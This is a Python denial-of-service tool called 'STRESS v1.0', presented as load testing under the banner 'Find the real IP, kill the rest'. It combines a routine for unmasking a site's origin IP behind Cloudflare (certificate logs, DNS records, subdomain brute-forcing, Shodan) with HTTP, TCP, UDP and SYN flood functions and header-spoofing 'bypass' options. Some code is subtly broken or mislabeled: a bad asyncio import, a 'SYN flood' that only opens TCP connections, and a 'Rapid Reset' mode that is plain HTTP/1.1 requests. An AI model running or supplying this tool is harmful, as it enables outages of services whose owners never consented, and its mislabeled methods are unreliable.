#!/usr/bin/env python3
"""
STRESS v1.0 - Layer 4/7 Load Testing & Origin Buster
"""

import sys
import os
import time
import socket
import random
import string
import hashlib
import ipaddress
import argparse
import threading
import queue
import struct
import base64
from concurrent.futures import ThreadPoolExecutor, asyncio
from datetime import datetime
from urllib.parse import urlparse
import re
import json
import tempfile

# ANSI colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'
CLEAR_LINE = '\033[2K'
CURSOR_UP = '\033[1A'

# Global state
running = True
stats = {
    'total_requests': 0,
    'successful': 0,
    'failed': 0,
    'bytes_sent': 0,
    'start_time': time.time()
}
stats_lock = threading.Lock()
proxies = []
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

# =============================================================================
# ORIGIN DISCOVERY ENGINE
# =============================================================================

class OriginDiscoverer:
    def __init__(self, domain, shodan_key=None, debug=False):
        self.domain = domain.lower().strip()
        self.shodan_key = shodan_key
        self.debug = debug
        self.origin_ips = []
        self.cloudflare_detected = False
        
    def log(self, msg, level="info"):
        prefix = {
            "info": f"{CYAN}[.]{RESET}",
            "success": f"{GREEN}[+]{RESET}",
            "warn": f"{YELLOW}[!]{RESET}",
            "error": f"{RED}[-]{RESET}"
        }.get(level, f"{CYAN}[.]{RESET}")
        print(f"{prefix} {msg}")
        
    def detect_cloudflare(self):
        """Check if domain uses Cloudflare"""
        try:
            import requests
            r = requests.get(f"http://{self.domain}", timeout=5, verify=False)
            headers = r.headers
            if 'cf-ray' in headers or 'cloudflare' in headers.get('server', '').lower():
                self.cloudflare_detected = True
                self.log("Cloudflare detected!", "warn")
                return True
        except:
            pass
        return False
    
    def check_ip_ranges(self):
        """Check if any IPs are in Cloudflare ranges"""
        try:
            ip = socket.gethostbyname(self.domain)
            # Quick Cloudflare IP check (simplified)
            if ip.startswith(('104.', '172.', '173.')):
                self.cloudflare_detected = True
                self.log("IP belongs to Cloudflare range", "warn")
                return True
        except:
            pass
        return False
    
    def method_crtsh(self):
        """Extract IPs from certificate transparency logs"""
        self.log("Trying crt.sh...", "info")
        try:
            import requests
            url = f"https://crt.sh/?q=%.{self.domain}&output=json"
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                certs = r.json()
                ip_pattern = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
                for cert in certs[:50]:
                    name = cert.get('name_value', '')
                    ips = re.findall(ip_pattern, name)
                    for ip in ips:
                        if ip not in self.origin_ips:
                            self.origin_ips.append(ip)
                            self.log(f"Found IP from crt.sh: {ip}", "success")
                return len(self.origin_ips) > 0
        except Exception as e:
            if self.debug:
                self.log(f"crt.sh error: {e}", "error")
        return False
    
    def method_securitytrails(self):
        """Try SecurityTrails API (free tier)"""
        self.log("Trying SecurityTrails...", "info")
        try:
            import requests
            url = f"https://api.securitytrails.com/v1/domain/{self.domain}/subdomains"
            headers = {'APIKEY': 'demo'}  # Free tier
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                for sub in data.get('subdomains', []):
                    full = f"{sub}.{self.domain}"
                    try:
                        ip = socket.gethostbyname(full)
                        if ip not in self.origin_ips:
                            self.origin_ips.append(ip)
                            self.log(f"Found IP from SecurityTrails: {ip}", "success")
                    except:
                        pass
                return len(self.origin_ips) > 0
        except Exception as e:
            if self.debug:
                self.log(f"SecurityTrails error: {e}", "error")
        return False
    
    def method_subdomains(self):
        """Bruteforce common subdomains that might not be proxied"""
        self.log("Trying subdomain bruteforce...", "info")
        subs = [
            'direct', 'origin', 'cdn', 'static', 'mail', 'ftp', 'ssh',
            'dev', 'staging', 'test', 'admin', 'portal', 'vpn', 'remote',
            'support', 'help', 'forum', 'blog', 'api', 'backup',
            'direct-connect', 'origin-www', 'origin-ssl', 'ssl',
            'direct', 'proxy', 'loadbalancer', 'lb', 'server',
            'ns1', 'ns2', 'ns3', 'dns1', 'dns2'
        ]
        
        found = False
        for sub in subs:
            try:
                host = f"{sub}.{self.domain}"
                ip = socket.gethostbyname(host)
                if ip not in self.origin_ips:
                    self.origin_ips.append(ip)
                    self.log(f"Found IP from {host}: {ip}", "success")
                    found = True
            except:
                pass
        return found
    
    def method_mx_spf(self):
        """Check MX and SPF records for IPs"""
        self.log("Checking MX/SPF records...", "info")
        try:
            import dns.resolver
            # MX records
            try:
                answers = dns.resolver.resolve(self.domain, 'MX')
                for rdata in answers:
                    mx = str(rdata.exchange).rstrip('.')
                    try:
                        ip = socket.gethostbyname(mx)
                        if ip not in self.origin_ips:
                            self.origin_ips.append(ip)
                            self.log(f"Found IP from MX {mx}: {ip}", "success")
                    except:
                        pass
            except:
                pass
            
            # TXT records for SPF
            try:
                answers = dns.resolver.resolve(self.domain, 'TXT')
                for rdata in answers:
                    txt = str(rdata)
                    if 'v=spf1' in txt:
                        ips = re.findall(r'ip[46]:([0-9./]+)', txt)
                        for ip_range in ips:
                            if '/' in ip_range:
                                # Expand range (simplified)
                                self.origin_ips.append(ip_range.split('/')[0])
                                self.log(f"Found IP from SPF: {ip_range}", "success")
                            else:
                                self.origin_ips.append(ip_range)
                                self.log(f"Found IP from SPF: {ip_range}", "success")
            except:
                pass
        except Exception as e:
            if self.debug:
                self.log(f"DNS error: {e}", "error")
        return len(self.origin_ips) > 0
    
    def method_shodan(self):
        """Use Shodan to find origin IP (requires API key)"""
        if not self.shodan_key:
            return False
        
        self.log("Trying Shodan...", "info")
        try:
            import shodan
            api = shodan.Shodan(self.shodan_key)
            
            # Search for SSL certificates matching domain
            results = api.search(f'ssl.cert.subject.cn:{self.domain}')
            for result in results.get('matches', []):
                ip = result.get('ip_str')
                if ip and ip not in self.origin_ips:
                    self.origin_ips.append(ip)
                    self.log(f"Found IP from Shodan SSL: {ip}", "success")
            
            # Search for hostnames
            results = api.search(f'hostname:{self.domain}')
            for result in results.get('matches', []):
                ip = result.get('ip_str')
                if ip and ip not in self.origin_ips:
                    self.origin_ips.append(ip)
                    self.log(f"Found IP from Shodan hostname: {ip}", "success")
            
            return len(self.origin_ips) > 0
        except Exception as e:
            if self.debug:
                self.log(f"Shodan error: {e}", "error")
        return False
    
    def method_verify(self):
        """Verify candidate IPs by requesting Host header"""
        self.log("Verifying candidate IPs...", "info")
        
        import requests
        verified = []
        
        # Get original response for comparison
        try:
            orig = requests.get(f"https://{self.domain}", timeout=5, verify=False)
            orig_title = re.findall(r'<title>(.*?)</title>', orig.text, re.IGNORECASE)
            orig_title = orig_title[0] if orig_title else ""
            orig_hash = hashlib.md5(orig.text[:1000].encode()).hexdigest()
        except:
            orig_title = ""
            orig_hash = ""
        
        for ip in self.origin_ips:
            try:
                r = requests.get(f"http://{ip}", headers={'Host': self.domain}, timeout=5, verify=False)
                
                # Check if response matches
                title = re.findall(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
                title = title[0] if title else ""
                hash_val = hashlib.md5(r.text[:1000].encode()).hexdigest()
                
                if orig_title and title == orig_title:
                    verified.append(ip)
                    self.log(f"✓ Verified origin: {ip} (title match)", "success")
                elif orig_hash and hash_val == orig_hash:
                    verified.append(ip)
                    self.log(f"✓ Verified origin: {ip} (hash match)", "success")
                elif r.status_code == 200:
                    verified.append(ip)
                    self.log(f"✓ Verified origin: {ip} (HTTP 200)", "success")
                else:
                    self.log(f"IP {ip} returned status {r.status_code}", "info")
            except:
                pass
        
        self.origin_ips = verified
        return len(verified) > 0
    
    def discover(self):
        """Run all discovery methods"""
        self.log(f"Starting origin discovery for {BOLD}{self.domain}{RESET}")
        
        # Check if Cloudflare is used
        if not self.detect_cloudflare():
            self.check_ip_ranges()
        
        if not self.cloudflare_detected:
            self.log("No Cloudflare detected, using original IP", "success")
            try:
                ip = socket.gethostbyname(self.domain)
                self.origin_ips.append(ip)
                return self.origin_ips
            except:
                pass
        
        # Run methods in priority order
        methods = [
            self.method_crtsh,
            self.method_securitytrails,
            self.method_mx_spf,
            self.method_subdomains,
        ]
        
        if self.shodan_key:
            methods.append(self.method_shodan)
        
        for method in methods:
            if method():
                if self.method_verify():
                    break
        
        if self.origin_ips:
            self.log(f"Found {len(self.origin_ips)} potential origin IPs", "success")
        else:
            self.log("No origin IPs found", "warn")
        
        return self.origin_ips

# =============================================================================
# ATTACK MODULES
# =============================================================================

def stats_printer():
    """Background thread to print stats"""
    while running:
        time.sleep(1)
        with stats_lock:
            elapsed = time.time() - stats['start_time']
            rate = stats['total_requests'] / elapsed if elapsed > 0 else 0
            mb_sent = stats['bytes_sent'] / 1024 / 1024
            
            print(f"\r{CLEAR_LINE}{CYAN}[{datetime.now().strftime('%H:%M:%S')}]{RESET} "
                  f"{GREEN}Req: {stats['total_requests']}{RESET} "
                  f"{BLUE}OK: {stats['successful']}{RESET} "
                  f"{RED}Fail: {stats['failed']}{RESET} "
                  f"{YELLOW}{rate:.0f} r/s{RESET} "
                  f"{WHITE}{mb_sent:.1f} MB{RESET}", end='', flush=True)

def rapid_reset(target_url, duration, threads, rate):
    """HTTP/2 Rapid Reset attack (CVE-2023-44487)"""
    print(f"{GREEN}[+] Starting Rapid Reset on {target_url}{RESET}")
    
    import requests
    
    def worker():
        end_time = time.time() + duration
        while running and time.time() < end_time:
            try:
                # Simulate rapid reset with HTTP/1.1 (fallback)
                s = requests.Session()
                for _ in range(rate):
                    try:
                        r = s.get(target_url, timeout=1, verify=False)
                        with stats_lock:
                            stats['total_requests'] += 1
                            if r.status_code < 400:
                                stats['successful'] += 1
                            else:
                                stats['failed'] += 1
                            stats['bytes_sent'] += len(r.content)
                    except:
                        with stats_lock:
                            stats['total_requests'] += 1
                            stats['failed'] += 1
                    time.sleep(0.001)
            except:
                pass
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join(timeout=duration + 1)

def http_flood(target_url, duration, threads, rate, bypass=False):
    """HTTP flood with optional bypass techniques"""
    print(f"{GREEN}[+] Starting HTTP flood on {target_url}{RESET}")
    
    import requests
    
    def worker():
        end_time = time.time() + duration
        while running and time.time() < end_time:
            try:
                headers = {'User-Agent': random.choice(user_agents)}
                
                if bypass:
                    # Add bypass headers
                    headers.update({
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                        'Accept': random.choice(['text/html', 'application/json', '*/*']),
                        'Accept-Language': random.choice(['en-US', 'pl-PL', 'de-DE']),
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'Referer': random.choice(['https://google.com', 'https://bing.com', target_url]),
                    })
                
                r = requests.get(target_url, headers=headers, timeout=2, verify=False)
                
                with stats_lock:
                    stats['total_requests'] += 1
                    if r.status_code < 400:
                        stats['successful'] += 1
                    else:
                        stats['failed'] += 1
                    stats['bytes_sent'] += len(r.content)
                
                # Rate limiting
                time.sleep(1/rate)
                
            except:
                with stats_lock:
                    stats['total_requests'] += 1
                    stats['failed'] += 1
                time.sleep(1/rate)
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join(timeout=duration + 1)

def tcp_flood(target, port, duration, threads):
    """TCP connect flood"""
    print(f"{GREEN}[+] Starting TCP flood on {target}:{port}{RESET}")
    
    def worker():
        end_time = time.time() + duration
        while running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.send(random._urandom(1024))
                sock.close()
                
                with stats_lock:
                    stats['total_requests'] += 1
                    stats['successful'] += 1
                    stats['bytes_sent'] += 1024
            except:
                with stats_lock:
                    stats['total_requests'] += 1
                    stats['failed'] += 1
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join(timeout=duration + 1)

def udp_flood(target, port, duration, threads, size=1024):
    """UDP flood"""
    print(f"{GREEN}[+] Starting UDP flood on {target}:{port}{RESET}")
    
    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(size)
        end_time = time.time() + duration
        
        while running and time.time() < end_time:
            try:
                sock.sendto(data, (target, port))
                with stats_lock:
                    stats['total_requests'] += 1
                    stats['successful'] += 1
                    stats['bytes_sent'] += size
            except:
                with stats_lock:
                    stats['total_requests'] += 1
                    stats['failed'] += 1
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join(timeout=duration + 1)

def syn_flood(target, port, duration, threads):
    """SYN flood (simulated with TCP connect)"""
    print(f"{GREEN}[+] Starting SYN flood on {target}:{port}{RESET}")
    
    def worker():
        end_time = time.time() + duration
        while running and time.time() < end_time:
            try:
                # Fast connect without data
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((target, port))
                sock.close()
                
                with stats_lock:
                    stats['total_requests'] += 1
                    stats['successful'] += 1
            except:
                with stats_lock:
                    stats['total_requests'] += 1
                    stats['failed'] += 1
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join(timeout=duration + 1)

# =============================================================================
# MAIN CLI
# =============================================================================

def print_banner():
    banner = f"""
{BOLD}{CYAN}
╔═══════════════════════════════════════════════════════════════╗
║                    STRESS v1.0                                 ║
║           Layer 4/7 Load Testing & Origin Buster              ║
║                   "Find the real IP, kill the rest"           ║
╚═══════════════════════════════════════════════════════════════╝
{RESET}
    """
    print(banner)

def parse_args():
    parser = argparse.ArgumentParser(
        description='STRESS v1.0 - Layer 4/7 Load Testing & Origin Buster',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python stress.py --rapidreset https://example.com --time 60 --threads 100 --rate 50
  python stress.py --httpflood https://example.com --time 30 --threads 50 --rate 10 --bypass
  python stress.py --tcp 192.168.1.1 80 --time 120 --threads 200
  python stress.py --udp 1.2.3.4 53 --time 60 --threads 100 --size 1400
  python stress.py --syn 1.2.3.4 80 --time 30 --threads 500
  python stress.py --stop
        """
    )
    
    # Attack modes
    parser.add_argument('--rapidreset', metavar='URL', help='HTTP/2 Rapid Reset attack')
    parser.add_argument('--httpflood', metavar='URL', help='HTTP flood attack')
    parser.add_argument('--tlsbypass', metavar='URL', help='TLS fingerprint randomization')
    parser.add_argument('--tcp', nargs=2, metavar=('IP', 'PORT'), help='TCP connect flood')
    parser.add_argument('--udp', nargs=2, metavar=('IP', 'PORT'), help='UDP bandwidth flood')
    parser.add_argument('--syn', nargs=2, metavar=('IP', 'PORT'), help='SYN flood')
    
    # Common options
    parser.add_argument('--time', type=int, default=30, help='Attack duration in seconds')
    parser.add_argument('--threads', type=int, default=50, help='Number of threads')
    parser.add_argument('--rate', type=int, default=10, help='Requests per second per thread')
    parser.add_argument('--size', type=int, default=1024, help='UDP packet size in bytes')
    parser.add_argument('--bypass', action='store_true', help='Enable bypass techniques')
    parser.add_argument('--shodan-key', help='Shodan API key for origin discovery')
    parser.add_argument('--debug', action='store_true', help='Verbose output')
    parser.add_argument('--stop', action='store_true', help='Stop all running attacks')
    
    return parser.parse_args()

def main():
    global running
    
    args = parse_args()
    
    if args.stop:
        running = False
        print(f"{GREEN}[+] Stop signal sent{RESET}")
        return
    
    print_banner()
    
    # Start stats printer
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()
    
    try:
        # Determine attack type and target
        if args.rapidreset:
            target = args.rapidreset
            attack_func = rapid_reset
            attack_args = (target, args.time, args.threads, args.rate)
            
        elif args.httpflood:
            target = args.httpflood
            attack_func = http_flood
            attack_args = (target, args.time, args.threads, args.rate, args.bypass)
            
        elif args.tlsbypass:
            target = args.tlsbypass
            print(f"{YELLOW}[!] TLS bypass is experimental{RESET}")
            attack_func = http_flood  # Fallback to HTTP flood
            attack_args = (target, args.time, args.threads, args.rate, True)
            
        elif args.tcp:
            target, port = args.tcp[0], int(args.tcp[1])
            attack_func = tcp_flood
            attack_args = (target, port, args.time, args.threads)
            
        elif args.udp:
            target, port = args.udp[0], int(args.udp[1])
            attack_func = udp_flood
            attack_args = (target, port, args.time, args.threads, args.size)
            
        elif args.syn:
            target, port = args.syn[0], int(args.syn[1])
            attack_func = syn_flood
            attack_args = (target, port, args.time, args.threads)
            
        else:
            print(f"{RED}[-] No attack specified{RESET}")
            sys.exit(1)
        
        # For domain targets doing L4 attacks, run origin discovery
        is_domain = not target.replace('.', '').isdigit()
        is_l4 = args.tcp or args.udp or args.syn
        
        if is_domain and is_l4:
            discoverer = OriginDiscoverer(target, args.shodan_key, args.debug)
            origin_ips = discoverer.discover()
            
            if origin_ips:
                print(f"{GREEN}[+] Using origin IP: {origin_ips[0]}{RESET}")
                # Replace target with first verified origin IP
                if args.tcp:
                    attack_args = (origin_ips[0], int(args.tcp[1]), args.time, args.threads)
                elif args.udp:
                    attack_args = (origin_ips[0], int(args.udp[1]), args.time, args.threads, args.size)
                elif args.syn:
                    attack_args = (origin_ips[0], int(args.syn[1]), args.time, args.threads)
            else:
                print(f"{YELLOW}[!] No origin IPs found, using original target (may be Cloudflare){RESET}")
        
        # Launch attack
        attack_func(*attack_args)
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted{RESET}")
    finally:
        running = False
        time.sleep(1)
        print(f"\n{GREEN}[+] Done. Total requests: {stats['total_requests']}{RESET}")

if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()
